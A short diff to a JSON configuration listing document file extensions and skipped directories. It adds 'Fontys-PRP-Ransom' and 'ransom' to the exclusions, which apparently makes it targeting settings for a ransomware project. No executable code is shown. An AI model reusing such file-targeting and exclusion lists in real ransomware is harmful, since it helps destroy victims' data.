@@ -4,7 +4,7 @@
     ".csv",  ".odt", ".rtf", ".mdb", ".accdb"
     ],
     "skipped_directories_general": ["android", "node_modules", "__pycache__", "venv",
-    "Google Drive", "Dropbox", "OneDrive", "ICloudDrive", "CloudStorage"
+    "Google Drive", "Dropbox", "OneDrive", "ICloudDrive", "CloudStorage", "Fontys-PRP-Ransom", "ransom"
     ],
     "skipped_directories_Darwin": ["System", "Volumes", "cores", "etc", "opt", "bin", "sbin", "usr", "private",
         "dev", "var", "tmp",
